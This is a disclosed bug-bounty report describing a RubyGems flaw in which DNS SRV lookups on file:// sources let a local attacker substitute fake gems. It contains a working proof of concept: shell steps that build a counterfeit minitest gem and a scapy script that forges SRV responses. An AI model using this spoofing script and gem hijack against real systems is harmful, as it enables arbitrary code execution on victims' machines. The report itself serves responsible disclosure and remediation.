# DNS SRV lookup of file:// sources enables local hijacking of gems

## Report Details
- **Report ID**: 411519
- **URL**: https://hackerone.com/reports/411519
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-09-19T18:10:29.578Z
- **Disclosed**: 2018-12-11T16:34:46.231Z

## Reporter
- **Username**: plover
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rubygems

## Vulnerability Information
# Summary

`gem` makes a DNS SRV query for each of its configured sources; the response is allowed to override the source URL in certain ways. The SRV query happens not only for http:// and https:// sources, but also for s3:// and file://. In the case of file://, the SRV response may add a prefix to the local filesystem path from which gems are fetched. As a consequence, an attacker who can provide or spoof DNS responses, and can write to the local filesystem, may cause a victim to download fake gems with arbitrary contents.

# Demonstration

Here is how an attacker may hijack a victim's installation of the `minitest` gem. The users `attacker` and `victim` share the same local filesystem. `victim` expects to install gems from /home/victim/trusted-gem-path, but `attacker` will force the installation to be from /tmp/attack/home/victim/trusted-gem-path instead.

First, `victim` sets up a file:// repo. This could also be done by some other party, like a local administrator.

```
victim$ mkdir -p /home/victim/trusted-gem-path/gems
victim$ (cd /home/victim/trusted-gem-path/gems && gem fetch --clear-sources --source https://rubygems.org/ minitest)
victim$ gem generate_index -d /home/victim/trusted-gem-path
```

Then `attacker` makes a malicious gem file and installs it under a prefix where `attacker` can write and `victim` can read. We'll use /tmp/attack.

```
# Make a malicious gem
attacker$ mkdir lib
attacker$ echo 'puts "hacked"' > lib/hacked.rb
attacker$ cat <<EOF > hacked.gemspec
Gem::Specification.new do |s|
  s.name = 'minitest'
  s.version = '5.11.3'
  s.files = ['lib/hacked.rb']
end
EOF
attacker$ gem build --force hacked.gemspec 
# Make it available under /tmp/attack
attacker$ mkdir -p /tmp/attack/home/victim/trusted-gem-path/gems
attacker$ cp minitest-5.11.3.gem /tmp/attack/home/victim/trusted-gem-path/gems
attacker$ gem generate_index -d /tmp/attack/home/victim/trusted-gem-path
```

Next, `attacker` runs a program to spoof SRV responses. This will require root privileges if run on the same host, but it could also be done from another host in the same local network. The attacker may even control the local DNS, for example by being the wi-fi admin.

```
#!/usr/bin/env python3

from scapy.all import *

TARGET = b"xxx./tmp/attack"

def respond(pkt):
    if not (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
        return
    q = pkt[DNSQR]
    # Nothing after "_rubygems._tcp." indicates that the host is empty;
    # i.e., that it's likely a lookup for a file:// URL. 33 == SRV.
    if not (q.qname == b"_rubygems._tcp." and q.qtype == 33):
        return
    resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) \
        / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) \
        / DNS(qr=1, id=pkt[DNS].id, qd=q, ancount=1) \
        / DNSRRSRV(type=33, rrname=q.qname, ttl=30, priority=0, weight=1, port=80, rdlen=8+len(TARGET), target=TARGET)
    send(resp)

sniff(filter="udp dst port 53", prn=respond)
```

Finally, `victim` tries to fetch a gem and specifically asks for their previously configured file:// source. `attacker`'s SRV response adds a /tmp/attack prefix and `victim` ends up with a malicious gem.

```
victim$ gem fetch --clear-sources --source file:///home/victim/trusted-gem-path minitest
victim$ tar -O -xf minitest-5.11.3.gem -- data.tar.gz | tar tzf -
lib/hacked.rb
```

# Analysis

The [`api_endpoint`](https://github.com/rubygems/rubygems/blob/27041c454411ae2b9372e4619b1e265096284930/lib/rubygems/remote_fetcher.rb#L97-L119) function takes a URL, extracts the host component, and then issues a SRV query for `_rubygems._tcp.#{host}`. Its usual purpose is to replace "rubygems.org" with "api.rubygems.org" in http:// and https:// URLs; but it is also called for s3:// and file:// URLs. In a typical file:// URL, the host component is empty, so the query will be for `_rubygems._tcp.`.

`api_endpoint` has the property that [it allows limited control of parts of the URL other than the host component](https://github.com/rubygems/rubygems/pull/2035): in particular you can add a prefix to the path component by including `/` characters in the SRV response. The attack works by sending a SRV response of `xxx./tmp/attack`. The `xxx.` can be anything, as long as it ends with a `.` in order to pass the subdomain check. Receiving such a response, `api_endpoint` transforms the input URL
```
file:///home/victim/trusted-gem-path
```
into the output URL
```
file://xxx./tmp/attack/home/victim/trusted-gem-path
```
In the output URL, the `xxx.` is technically the host component, but it doesn't matter because it [is ignored](https://github.com/rubygems/rubygems/blob/27041c454411ae2b9372e4619b1e265096284930/lib/rubygems/remote_fetcher.rb#L237-L242).

The conditions for exploitation seem fairly narrow:
- The victim and attacker must share a filesystem.
- The attacker must know the path to the victim's file:// repo.
- The attacker must anticipate the name of a gem that the victim will install.
- The attacker must be able to provide DNS responses.

I don't know how common such conditions are. While `gem` supports file:// sources, I wasn't able to find much information on configuring them other than [one bug report](https://github.com/rubygems/rubygems/issues/761). It seems it's more common to do a [shared repository over http](https://guides.rubygems.org/run-your-own-gem-server/) than using a shared filesystem. Commit [37d486cfd9](https://github.com/rubygems/rubygems/commit/37d486cfd97fc0f4d17f2de0799269535f330721) says "bundler gemspecs use file:// URIs for their sources," but I could not find in Bundler where that happens.

# Remediation

The best solution seems to be not to call `api_endpoint` for file:// (and s3://) URLs. The host component of such URLs doesn't have the same meaning as it does in http:// and https:// URLs.

A mitigation that in this case would be sufficient would be to apply stricter validation of SRV responses, not allowing them to modify any components other than the host ([GitHub \#2035](https://github.com/rubygems/rubygems/pull/2035), [HackerOne \#274267](https://hackerone.com/reports/274267)).

## Impact

The CVSS calculator says the severity is "high" but I would put it at "low" because of the difficulty of execution. The impact is indeed bad: arbitrary code execution using the victim's privileges, whether through Ruby code or a C extension. But as far as I can tell, the conditions for exploitation are uncommon.

## Attachments
No attachments
